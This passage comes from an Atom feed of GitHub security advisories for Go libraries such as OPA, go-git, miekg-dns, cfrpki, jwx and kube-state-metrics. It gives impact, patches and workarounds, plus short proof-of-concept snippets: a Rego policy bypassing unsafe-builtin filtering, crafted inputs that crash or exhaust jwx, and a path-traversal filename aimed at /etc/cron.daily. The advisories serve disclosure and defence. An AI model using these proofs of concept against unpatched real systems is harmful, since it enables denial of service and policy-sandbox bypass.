<li><a href="https://github.com/fluxcd/kustomize-controller/pull/731">https://github.com/fluxcd/kustomize-controller/pull/731</a></li>
<li><a href="https://github.com/fluxcd/notification-controller/pull/420">https://github.com/fluxcd/notification-controller/pull/420</a></li>
<li><a href="https://github.com/fluxcd/source-controller/pull/903">https://github.com/fluxcd/source-controller/pull/903</a></li>
<li><a href="https://github.com/kubernetes/apimachinery#131">https://github.com/kubernetes/apimachinery#131</a></li>
<li><a href="https://pkg.go.dev/vuln/GO-2022-1071">https://pkg.go.dev/vuln/GO-2022-1071</a></li>
<li><a href="https://github.com/advisories/GHSA-f4p5-x4vc-mh4v">https://github.com/advisories/GHSA-f4p5-x4vc-mh4v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-f4p5-x4vc-mh4v</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-10-19T18:40:02.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/open-policy-agent/opa] OPA Compiler: Bypass of WithUnsafeBuiltins using "with" keyword to mock functions]]></title>
        <id>https://github.com/advisories/GHSA-f524-rf33-2jjr</id>
        <link href="https://github.com/advisories/GHSA-f524-rf33-2jjr"/>
        <updated>2024-01-23T20:38:00.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The Rego compiler provides a (deprecated) <code>WithUnsafeBuiltins</code> function, which allows users to provide a set of built-in functions that should be deemed unsafe — and as such rejected — by the compiler if encountered in the policy compilation stage. A bypass of this protection has been found, where the use of the <code>with</code> keyword to mock such a built-in function (a feature introduced in OPA v0.40.0), isn’t taken into account by <code>WithUnsafeBuiltins</code>.</p>
<p>The same method is exposed via <code>rego.UnsafeBuiltins</code> in the <code>github.com/open-policy-agent/opa/rego</code> package.</p>
<p>When provided e.g. the <code>http.send</code> built-in function to <code>WithUnsafeBuiltins</code>, the following policy would still compile, and call the <code>http.send</code> function with the arguments provided to the <code>is_object</code> function when evaluated:</p>
<pre><code class="language-rego">package policy

foo := is_object({
    "method": "get", 
    "url": "https://www.openpolicyagent.org"
})

allow := r {
    r := foo with is_object as http.send
}
</code></pre>
<p>Both built-in functions and user provided (i.e. custom) functions are mockable using this construct.</p>
<p>In addition to <code>http.send</code>, the <code>opa.runtime</code> built-in function is commonly considered unsafe in integrations where policy provided by untrusted parties is evaluated, as it risks exposing configuration, or environment variables, potentially carrying sensitive information.</p>
<h4 id="affected-users">Affected Users</h4>
<p><strong>All of these conditions have to be met</strong> to create an adverse effect:</p>
<ul>
<li>Use the Go API for policy evaluation (not the OPA server, or the Go SDK)</li>
<li>Make use of the <code>WithUnsafeBuiltins</code> method in order to deny certain built-in functions, like e.g. <code>http.send</code>, from being used in policy evaluation.</li>
<li>Allow policy evaluation of policies provided by untrusted parties.</li>
<li>The policies evaluated include the <code>with</code> keyword to rewrite/mock a built-in, or custom, function to that of another built-in function, such as <code>http.send</code>.</li>
</ul>
<p><strong>Additionally, the OPA Query API</strong> is affected:</p>
<ul>
<li>If the OPA <a href="https://www.openpolicyagent.org/docs/latest/rest-api/#query-api">Query API</a> is exposed to the public, and it is relied on <code>http.send</code> to be unavailable in that context. Exposing the OPA API to the public without proper <a href="https://www.openpolicyagent.org/docs/latest/security/#authentication-and-authorization">authentication and authorization</a> in place is generally advised against.</li>
</ul>
<h3 id="patches">Patches</h3>
<p>v0.43.1, v0.44.0</p>
<h3 id="workarounds">Workarounds</h3>
<p>The <code>WithUnsafeBuiltins</code>  function has been considered deprecated since the introduction of the <a href="https://www.openpolicyagent.org/docs/latest/deployments/#capabilities">capabilities</a> feature in OPA v0.23.0 . While the function was commented as deprecated, the format of the comment was however not following the <a href="https://zchee.github.io/golang-wiki/Deprecated/">convention</a> for deprecated functions, and might not have been picked up by tooling like editors. This has now been fixed. Users are still encouraged to use the capabilities feature over the deprecated <code>WithUnsafeBuiltins</code> function.</p>
<p><strong>If you cannot upgrade</strong>, consider using capabilities instead:</p>
<p>Code like this using the <code>github.com/open-policy-agent/opa/ast</code> package:</p>
<pre><code class="language-go">// VULNERABLE with OPA &lt;= 0.43.0
unsafeBuiltins := map[string]struct{}{
    ast.HTTPSend.Name: struct{}{},
}
compiler := ast.NewCompiler().WithUnsafeBuiltins(unsafeBuiltins)
</code></pre>
<p>needs to be changed to this:</p>
<pre><code class="language-go">caps := ast.CapabilitiesForThisVersion()
var j int
for i, bi := range caps.Builtins {
    if bi.Name == ast.HTTPSend.Name {
        j = i
        break
    }
}
caps.Builtins[j] = caps.Builtins[len(caps.Builtins)-1] // put last element into position j
caps.Builtins = caps.Builtins[:len(caps.Builtins)-1]   // truncate slice

compiler := ast.NewCompiler().WithCapabilities(caps)
</code></pre>
<p>When using the <code>github.com/open-policy-agent/opa/rego</code> package:</p>
<pre><code class="language-go">// VULNERABLE with OPA &lt;= 0.43.0
r := rego.New(
    // other options omitted
    rego.UnsafeBuiltins(map[string]struct{}{ast.HTTPSend.Name: struct{}{}}),
)
</code></pre>
<p>needs to be changed to</p>
<pre><code class="language-go">r := rego.New(
    // other options omitted
    rego.Capabilities(caps),
)
</code></pre>
<p>with <code>caps</code> defined above.</p>
<p>Note that in the process, some error messages will change: <code>http.send</code> in this example will no longer be "unsafe" and thus forbidden, but it will simply become an "unknown function".</p>
<h3 id="references">References</h3>
<ul>
<li>Fix commit on <code>main</code>: <a href="https://github.com/open-policy-agent/opa/commit/25a597bc3f4985162e7f65f9c36599f4f8f55823">https://github.com/open-policy-agent/opa/commit/25a597bc3f4985162e7f65f9c36599f4f8f55823</a></li>
<li>Fix commit in 0.43.1 release: <a href="https://github.com/open-policy-agent/opa/commit/3e8c754ed007b22393cf65e48751ad9f6457fee8">https://github.com/open-policy-agent/opa/commit/3e8c754ed007b22393cf65e48751ad9f6457fee8</a>, release page for 0.43.1: <a href="https://github.com/open-policy-agent/opa/releases/tag/v0.43.1">https://github.com/open-policy-agent/opa/releases/tag/v0.43.1</a></li>
<li>Function mocking feature introduced in <a href="https://github.com/open-policy-agent/opa/pull/4540">https://github.com/open-policy-agent/opa/pull/4540</a> and <a href="https://github.com/open-policy-agent/opa/pull/4616">https://github.com/open-policy-agent/opa/pull/4616</a> </li>
<li>Documentation on the <a href="https://www.openpolicyagent.org/docs/latest/deployments/#capabilities">capabilities</a> feature, which is the preferred way of providing a list of allowed built-in functions. The capabilities feature is <strong>not</strong> affected by this vulnerability.</li>
</ul>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory:</p>
<ul>
<li>Open an issue in <a href="https://github.com/open-policy-agent/community/discussions/categories/opa-and-rego">Community Discussions</a></li>
<li>Ask in Slack: <a href="https://slack.openpolicyagent.org/">https://slack.openpolicyagent.org/</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/open-policy-agent/opa/security/advisories/GHSA-f524-rf33-2jjr">https://github.com/open-policy-agent/opa/security/advisories/GHSA-f524-rf33-2jjr</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-36085">https://nvd.nist.gov/vuln/detail/CVE-2022-36085</a></li>
<li><a href="https://github.com/open-policy-agent/opa/pull/4540">https://github.com/open-policy-agent/opa/pull/4540</a></li>
<li><a href="https://github.com/open-policy-agent/opa/pull/4616">https://github.com/open-policy-agent/opa/pull/4616</a></li>
<li><a href="https://github.com/open-policy-agent/opa/commit/25a597bc3f4985162e7f65f9c36599f4f8f55823">https://github.com/open-policy-agent/opa/commit/25a597bc3f4985162e7f65f9c36599f4f8f55823</a></li>
<li><a href="https://github.com/open-policy-agent/opa/commit/3e8c754ed007b22393cf65e48751ad9f6457fee8">https://github.com/open-policy-agent/opa/commit/3e8c754ed007b22393cf65e48751ad9f6457fee8</a></li>
<li><a href="https://github.com/open-policy-agent/opa/releases/tag/v0.43.1">https://github.com/open-policy-agent/opa/releases/tag/v0.43.1</a></li>
<li><a href="https://pkg.go.dev/vuln/GO-2022-0978">https://pkg.go.dev/vuln/GO-2022-0978</a></li>
<li><a href="https://github.com/advisories/GHSA-f524-rf33-2jjr">https://github.com/advisories/GHSA-f524-rf33-2jjr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-f524-rf33-2jjr</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2022-09-16T17:42:47.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/miekg/dns] Denial of Service in miekg-dns]]></title>
        <id>https://github.com/advisories/GHSA-p55x-7x9v-q8m4</id>
        <link href="https://github.com/advisories/GHSA-p55x-7x9v-q8m4"/>
        <updated>2024-01-23T20:37:02.000Z</updated>
        <content type="html"><![CDATA[<p>A denial of service flaw was found in miekg-dns before 1.0.4. A remote attacker could use carefully timed TCP packets to block the DNS server from accepting new connections.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2017-15133">https://nvd.nist.gov/vuln/detail/CVE-2017-15133</a></li>
<li><a href="https://github.com/miekg/dns/issues/627">https://github.com/miekg/dns/issues/627</a></li>
<li><a href="https://github.com/miekg/dns/pull/631">https://github.com/miekg/dns/pull/631</a></li>
<li><a href="https://github.com/miekg/dns/commit/43913f2f4fbd7dcff930b8a809e709591e4dd79e">https://github.com/miekg/dns/commit/43913f2f4fbd7dcff930b8a809e709591e4dd79e</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=1538763">https://bugzilla.redhat.com/show_bug.cgi?id=1538763</a></li>
<li><a href="https://pkg.go.dev/vuln/GO-2020-0006">https://pkg.go.dev/vuln/GO-2020-0006</a></li>
<li><a href="https://github.com/advisories/GHSA-p55x-7x9v-q8m4">https://github.com/advisories/GHSA-p55x-7x9v-q8m4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-p55x-7x9v-q8m4</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2021-06-29T21:45:07.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/cloudflare/cfrpki] Arbitrary filepath traversal via URI injection ]]></title>
        <id>https://github.com/advisories/GHSA-cqh2-vc2f-q4fh</id>
        <link href="https://github.com/advisories/GHSA-cqh2-vc2f-q4fh"/>
        <updated>2024-01-23T20:36:22.000Z</updated>
        <content type="html"><![CDATA[<p>OctoRPKI does not escape a URI with a filename containing "..", this allows a repository to create a file, (ex.  <code>rsync://example.org/repo/../../etc/cron.daily/evil.roa</code>), which would then be written to disk outside the base cache folder. This could allow for remote code execution on the host machine OctoRPKI is running on. </p>
<h2 id="patches">Patches</h2>
<h2 id="for-more-information">For more information</h2>
<p>If you have any questions or comments about this advisory email us at <a href="mailto:security@cloudflare.com">security@cloudflare.com</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/cloudflare/cfrpki/security/advisories/GHSA-cqh2-vc2f-q4fh">https://github.com/cloudflare/cfrpki/security/advisories/GHSA-cqh2-vc2f-q4fh</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-3907">https://nvd.nist.gov/vuln/detail/CVE-2021-3907</a></li>
<li><a href="https://www.debian.org/security/2021/dsa-5033">https://www.debian.org/security/2021/dsa-5033</a></li>
<li><a href="https://www.debian.org/security/2022/dsa-5041">https://www.debian.org/security/2022/dsa-5041</a></li>
<li><a href="https://github.com/cloudflare/cfrpki/security/advisories/GHSA-3jhm-87m6-x959">https://github.com/cloudflare/cfrpki/security/advisories/GHSA-3jhm-87m6-x959</a></li>
<li><a href="https://github.com/cloudflare/cfrpki/commit/eb9cc4db7b7b79e44f56dfaa959fccdfb2af8284">https://github.com/cloudflare/cfrpki/commit/eb9cc4db7b7b79e44f56dfaa959fccdfb2af8284</a></li>
<li><a href="https://pkg.go.dev/vuln/GO-2022-0248">https://pkg.go.dev/vuln/GO-2022-0248</a></li>
<li><a href="https://github.com/cloudflare/cfrpki/commit/a053a808feeb3115c76b6cc263ee55598ce6e8cd">https://github.com/cloudflare/cfrpki/commit/a053a808feeb3115c76b6cc263ee55598ce6e8cd</a></li>
<li><a href="https://github.com/advisories/GHSA-cqh2-vc2f-q4fh">https://github.com/advisories/GHSA-cqh2-vc2f-q4fh</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cqh2-vc2f-q4fh</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2021-11-10T20:08:29.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[gopkg.in/src-d/go-git.v4] Maliciously crafted Git server replies can lead to path traversal and RCE on go-git clients]]></title>
        <id>https://github.com/advisories/GHSA-449p-3h89-pw88</id>
        <link href="https://github.com/advisories/GHSA-449p-3h89-pw88"/>
        <updated>2024-01-23T18:50:24.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A path traversal vulnerability was discovered in go-git versions prior to <code>v5.11</code>. This vulnerability allows an attacker to create and amend files across the filesystem. In the worse case scenario, remote code execution could be achieved.</p>
<p>Applications are only affected if they are using the <a href="https://pkg.go.dev/github.com/go-git/go-billy/v5/osfs#ChrootOS">ChrootOS</a>, which is the default when using "Plain" versions of Open and Clone funcs (e.g. PlainClone). Applications using <a href="https://pkg.go.dev/github.com/go-git/go-billy/v5/osfs#BoundOS">BoundOS</a> or in-memory filesystems are not affected by this issue.
This is a <code>go-git</code> implementation issue and does not affect the upstream <code>git</code> cli.</p>
<h3 id="patches">Patches</h3>
<p>Users running versions of <code>go-git</code> from <code>v4</code> and above are recommended to upgrade to <code>v5.11</code> in order to mitigate this vulnerability.</p>
<h3 id="workarounds">Workarounds</h3>
<p>In cases where a bump to the latest version of <code>go-git</code> is not possible in a timely manner, we recommend limiting its use to only trust-worthy Git servers.</p>
<h2 id="credit">Credit</h2>
<p>Thanks to Ionut Lalu for responsibly disclosing this vulnerability to us.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/go-git/go-git/security/advisories/GHSA-449p-3h89-pw88">https://github.com/go-git/go-git/security/advisories/GHSA-449p-3h89-pw88</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-49569">https://nvd.nist.gov/vuln/detail/CVE-2023-49569</a></li>
<li><a href="https://github.com/advisories/GHSA-449p-3h89-pw88">https://github.com/advisories/GHSA-449p-3h89-pw88</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-449p-3h89-pw88</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2024-01-10T15:37:05.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/lestrrat-go/jwx/v2] Parsing JSON serialized payload without protected field can lead to segfault]]></title>
        <id>https://github.com/advisories/GHSA-pvcr-v8j8-j5q3</id>
        <link href="https://github.com/advisories/GHSA-pvcr-v8j8-j5q3"/>
        <updated>2024-01-24T16:16:57.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Calling <code>jws.Parse</code> with a JSON serialized payload where the <code>signature</code> field is present while <code>protected</code> is absent can lead to a nil pointer dereference.</p>
<h3 id="details">Details</h3>
<p>This seems to also affect other functions that calls <code>Parse</code> internally, like <code>jws.Verify</code>.</p>
<p>My understanding of these functions from the docs is that they are supposed to fail gracefully on invalid input and don't require any prior validation.</p>
<p>Based on the stack trace in the PoC, the issue seems to be that the processing done in <code>jws/message.go:UnmarshalJSON()</code> assumes that if a <code>signature</code> field is present, then a <code>protected</code> field is also present. If this is not the case, then the subsequent call to <code>getB64Value(sig.protected)</code> will dereference <code>sig.protected</code>, which is <code>nil</code>.</p>
<h3 id="poc">PoC</h3>
<p>Reproducer:</p>
<pre><code class="language-go">package poc

import (
        "testing"

        "github.com/lestrrat-go/jwx/v2/jws"
)

func TestPOC(t *testing.T) {
        _, _ = jws.Parse([]byte(`{"signature": ""}`))
}
</code></pre>
<p>Result:</p>
<pre><code>$ go test        
--- FAIL: TestPOC (0.00s)
panic: runtime error: invalid memory address or nil pointer dereference [recovered]
        panic: runtime error: invalid memory address or nil pointer dereference
[signal SIGSEGV: segmentation violation code=0x1 addr=0x40 pc=0x5fd618]

goroutine 6 [running]:
testing.tRunner.func1.2({0x628800, 0x831030})
        /usr/local/go/src/testing/testing.go:1545 +0x238
testing.tRunner.func1()
        /usr/local/go/src/testing/testing.go:1548 +0x397
panic({0x628800?, 0x831030?})
        /usr/local/go/src/runtime/panic.go:914 +0x21f
github.com/lestrrat-go/jwx/v2/jws.getB64Value({0x0?, 0x0?})
        /home/fredrik/go/pkg/mod/github.com/lestrrat-go/jwx/v2@v2.0.18/jws/jws.go:484 +0x18
github.com/lestrrat-go/jwx/v2/jws.(*Message).UnmarshalJSON(0xc0000a2140, {0xc0000ec000, 0x11, 0x200})
        /home/fredrik/go/pkg/mod/github.com/lestrrat-go/jwx/v2@v2.0.18/jws/message.go:323 +0x4ad
encoding/json.(*decodeState).object(0xc0000ea028, {0x64fa60?, 0xc0000a2140?, 0x16?})
        /usr/local/go/src/encoding/json/decode.go:604 +0x6cc
encoding/json.(*decodeState).value(0xc0000ea028, {0x64fa60?, 0xc0000a2140?, 0xc00006e630?})
        /usr/local/go/src/encoding/json/decode.go:374 +0x3e
encoding/json.(*decodeState).unmarshal(0xc0000ea028, {0x64fa60?, 0xc0000a2140?})
        /usr/local/go/src/encoding/json/decode.go:181 +0x133
encoding/json.(*Decoder).Decode(0xc0000ea000, {0x64fa60, 0xc0000a2140})
        /usr/local/go/src/encoding/json/stream.go:73 +0x179
github.com/lestrrat-go/jwx/v2/internal/json.Unmarshal({0xc00001a288, 0x11, 0x11}, {0x64fa60, 0xc0000a2140})
        /home/fredrik/go/pkg/mod/github.com/lestrrat-go/jwx/v2@v2.0.18/internal/json/json.go:26 +0x97
github.com/lestrrat-go/jwx/v2/jws.parseJSON({0xc00001a288, 0x11, 0x11})
        /home/fredrik/go/pkg/mod/github.com/lestrrat-go/jwx/v2@v2.0.18/jws/jws.go:588 +0x50
github.com/lestrrat-go/jwx/v2/jws.Parse({0xc00001a288, 0x11, 0x11}, {0x0?, 0xc00006e760?, 0x48450f?})
        /home/fredrik/go/pkg/mod/github.com/lestrrat-go/jwx/v2@v2.0.18/jws/jws.go:525 +0x89
poc.TestPOC(0x0?)
        /home/fredrik/src/jwx_poc/poc_test.go:10 +0x57
testing.tRunner(0xc0000e4340, 0x68ef30)
        /usr/local/go/src/testing/testing.go:1595 +0xff
created by testing.(*T).Run in goroutine 1
        /usr/local/go/src/testing/testing.go:1648 +0x3ad
exit status 2
FAIL    poc     0.005s
</code></pre>
<h3 id="impact">Impact</h3>
<p>The vulnerability can be used to crash / DOS a system doing JWS verification.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/lestrrat-go/jwx/security/advisories/GHSA-pvcr-v8j8-j5q3">https://github.com/lestrrat-go/jwx/security/advisories/GHSA-pvcr-v8j8-j5q3</a></li>
<li><a href="https://github.com/lestrrat-go/jwx/commit/0e8802ce6842625845d651456493e7c87625601f">https://github.com/lestrrat-go/jwx/commit/0e8802ce6842625845d651456493e7c87625601f</a></li>
<li><a href="https://github.com/lestrrat-go/jwx/commit/d69a721931a5c48b9850a42404f18e143704adcd">https://github.com/lestrrat-go/jwx/commit/d69a721931a5c48b9850a42404f18e143704adcd</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-21664">https://nvd.nist.gov/vuln/detail/CVE-2024-21664</a></li>
<li><a href="https://github.com/lestrrat-go/jwx/commit/8c53d0ae52d5ab1e2b37c5abb67def9e7958fd65">https://github.com/lestrrat-go/jwx/commit/8c53d0ae52d5ab1e2b37c5abb67def9e7958fd65</a></li>
<li><a href="https://github.com/advisories/GHSA-pvcr-v8j8-j5q3">https://github.com/advisories/GHSA-pvcr-v8j8-j5q3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-pvcr-v8j8-j5q3</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-01-09T16:18:48.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[gopkg.in/src-d/go-git.v4] Maliciously crafted Git server replies can cause DoS on go-git clients]]></title>
        <id>https://github.com/advisories/GHSA-mw99-9chc-xw7r</id>
        <link href="https://github.com/advisories/GHSA-mw99-9chc-xw7r"/>
        <updated>2024-01-23T18:49:16.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A denial of service (DoS) vulnerability was discovered in go-git versions prior to <code>v5.11</code>. This vulnerability allows an attacker to perform denial of service attacks by providing specially crafted responses from a Git server which triggers resource exhaustion in <code>go-git</code> clients. </p>
<p>Applications using only the in-memory filesystem supported by <code>go-git</code> are not affected by this vulnerability.
This is a <code>go-git</code> implementation issue and does not affect the upstream <code>git</code> cli.</p>
<h3 id="patches">Patches</h3>
<p>Users running versions of <code>go-git</code> from <code>v4</code> and above are recommended to upgrade to <code>v5.11</code> in order to mitigate this vulnerability.</p>
<h3 id="workarounds">Workarounds</h3>
<p>In cases where a bump to the latest version of <code>go-git</code> is not possible, we recommend limiting its use to only trust-worthy Git servers.</p>
<h2 id="credit">Credit</h2>
<p>Thanks to Ionut Lalu for responsibly disclosing this vulnerability to us.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/go-git/go-git/security/advisories/GHSA-mw99-9chc-xw7r">GHSA-mw99-9chc-xw7r</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/go-git/go-git/security/advisories/GHSA-mw99-9chc-xw7r">https://github.com/go-git/go-git/security/advisories/GHSA-mw99-9chc-xw7r</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-49568">https://nvd.nist.gov/vuln/detail/CVE-2023-49568</a></li>
<li><a href="https://github.com/advisories/GHSA-mw99-9chc-xw7r">https://github.com/advisories/GHSA-mw99-9chc-xw7r</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mw99-9chc-xw7r</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2023-12-27T15:06:52.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/lestrrat-go/jwx/v2] lestrrat-go/jwx's malicious parameters in JWE can cause a DOS]]></title>
        <id>https://github.com/advisories/GHSA-7f9x-gw85-8grf</id>
        <link href="https://github.com/advisories/GHSA-7f9x-gw85-8grf"/>
        <updated>2024-01-23T18:45:09.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>too high p2c parameter in JWE's alg PBES2-* could lead to a DOS attack</p>
<h3 id="details">Details</h3>
<p>The JWE key management algorithms based on PBKDF2 require a JOSE Header Parameter called p2c (PBES2 Count). This parameter dictates the number of PBKDF2 iterations needed to derive a CEK wrapping key. Its primary purpose is to intentionally slow down the key derivation function, making password brute-force and dictionary attacks more resource- intensive.
Therefore, if an attacker sets the p2c parameter in JWE to a very large number, it can cause a lot of computational consumption, resulting in a DOS attack</p>
<h3 id="poc">PoC</h3>
<pre><code class="language-go">package main

import (
    "fmt"
    "github.com/lestrrat-go/jwx/v2/jwa"
    "github.com/lestrrat-go/jwx/v2/jwe"
    "github.com/lestrrat-go/jwx/v2/jwk"
)

func main() {
    token := []byte("eyJhbGciOiJQQkVTMi1IUzI1NitBMTI4S1ciLCJlbmMiOiJBMjU2R0NNIiwicDJjIjoyMDAwMDAwMDAwLCJwMnMiOiJNNzczSnlmV2xlX2FsSXNrc0NOTU9BIn0=.S8B1kXdIR7BM6i_TaGsgqEOxU-1Sgdakp4mHq7UVhn-_REzOiGz2gg.gU_LfzhBXtQdwYjh.9QUIS-RWkLc.m9TudmzUoCzDhHsGGfzmCA")
    key, err := jwk.FromRaw([]byte(`abcdefg`))
    payload, err := jwe.Decrypt(token, jwe.WithKey(jwa.PBES2_HS256_A128KW, key))
    if err == nil {
        fmt.Println(string(payload))
    }
}
</code></pre>
<h3 id="impact">Impact</h3>
<p>It's a kind of Dos attack, the user's environment could potentially utilize an excessive amount of CPU resources.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/lestrrat-go/jwx/security/advisories/GHSA-7f9x-gw85-8grf">https://github.com/lestrrat-go/jwx/security/advisories/GHSA-7f9x-gw85-8grf</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-49290">https://nvd.nist.gov/vuln/detail/CVE-2023-49290</a></li>
<li><a href="https://github.com/lestrrat-go/jwx/commit/64f2a229b8e18605f47361d292b526bdc4aee01c">https://github.com/lestrrat-go/jwx/commit/64f2a229b8e18605f47361d292b526bdc4aee01c</a></li>
<li><a href="https://github.com/advisories/GHSA-7f9x-gw85-8grf">https://github.com/advisories/GHSA-7f9x-gw85-8grf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7f9x-gw85-8grf</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-12-05T23:29:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/lestrrat-go/jwx] lestrrat-go/jwx's malicious parameters in JWE can cause a DOS]]></title>
        <id>https://github.com/advisories/GHSA-7f9x-gw85-8grf</id>
        <link href="https://github.com/advisories/GHSA-7f9x-gw85-8grf"/>
        <updated>2024-01-23T18:45:09.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>too high p2c parameter in JWE's alg PBES2-* could lead to a DOS attack</p>
<h3 id="details">Details</h3>
<p>The JWE key management algorithms based on PBKDF2 require a JOSE Header Parameter called p2c (PBES2 Count). This parameter dictates the number of PBKDF2 iterations needed to derive a CEK wrapping key. Its primary purpose is to intentionally slow down the key derivation function, making password brute-force and dictionary attacks more resource- intensive.
Therefore, if an attacker sets the p2c parameter in JWE to a very large number, it can cause a lot of computational consumption, resulting in a DOS attack</p>
<h3 id="poc">PoC</h3>
<pre><code class="language-go">package main

import (
    "fmt"
    "github.com/lestrrat-go/jwx/v2/jwa"
    "github.com/lestrrat-go/jwx/v2/jwe"
    "github.com/lestrrat-go/jwx/v2/jwk"
)

func main() {
    token := []byte("eyJhbGciOiJQQkVTMi1IUzI1NitBMTI4S1ciLCJlbmMiOiJBMjU2R0NNIiwicDJjIjoyMDAwMDAwMDAwLCJwMnMiOiJNNzczSnlmV2xlX2FsSXNrc0NOTU9BIn0=.S8B1kXdIR7BM6i_TaGsgqEOxU-1Sgdakp4mHq7UVhn-_REzOiGz2gg.gU_LfzhBXtQdwYjh.9QUIS-RWkLc.m9TudmzUoCzDhHsGGfzmCA")
    key, err := jwk.FromRaw([]byte(`abcdefg`))
    payload, err := jwe.Decrypt(token, jwe.WithKey(jwa.PBES2_HS256_A128KW, key))
    if err == nil {
        fmt.Println(string(payload))
    }
}
</code></pre>
<h3 id="impact">Impact</h3>
<p>It's a kind of Dos attack, the user's environment could potentially utilize an excessive amount of CPU resources.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/lestrrat-go/jwx/security/advisories/GHSA-7f9x-gw85-8grf">https://github.com/lestrrat-go/jwx/security/advisories/GHSA-7f9x-gw85-8grf</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-49290">https://nvd.nist.gov/vuln/detail/CVE-2023-49290</a></li>
<li><a href="https://github.com/lestrrat-go/jwx/commit/64f2a229b8e18605f47361d292b526bdc4aee01c">https://github.com/lestrrat-go/jwx/commit/64f2a229b8e18605f47361d292b526bdc4aee01c</a></li>
<li><a href="https://github.com/advisories/GHSA-7f9x-gw85-8grf">https://github.com/advisories/GHSA-7f9x-gw85-8grf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7f9x-gw85-8grf</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-12-05T23:29:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[k8s.io/kube-state-metrics] Duplicate Advisory: k8s.io/kube-state-metrics Exposure of Sensitive Information]]></title>
        <id>https://github.com/advisories/GHSA-2v6x-frw8-7r7f</id>
        <link href="https://github.com/advisories/GHSA-2v6x-frw8-7r7f"/>
        <updated>2024-01-23T17:50:31.000Z</updated>
        <content type="html"><![CDATA[<h1 id="duplicate-advisory">Duplicate Advisory</h1>
<p>This advisory has been withdrawn because it is a duplicate of GHSA-c92w-72c5-9x59. This link is maintained to preserve external references.</p>
<h1 id="original-description">Original Description</h1>
<p>A security issue was discovered in kube-state-metrics 1.7.x before 1.7.2. An experimental feature was added to v1.7.0 and v1.7.1 that enabled annotations to be exposed as metrics. By default, kube-state-metrics metrics only expose metadata about Secrets. However, a combination of the default kubectl behavior and this new feature can cause the entire secret content to end up in metric labels, thus inadvertently exposing the secret content in metrics.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2019-17110">https://nvd.nist.gov/vuln/detail/CVE-2019-17110</a></li>
<li><a href="https://github.com/kubernetes/kube-state-metrics/commit/03122fe3e2df49a9a7298b8af921d3c37c430f7f">https://github.com/kubernetes/kube-state-metrics/commit/03122fe3e2df49a9a7298b8af921d3c37c430f7f</a></li>
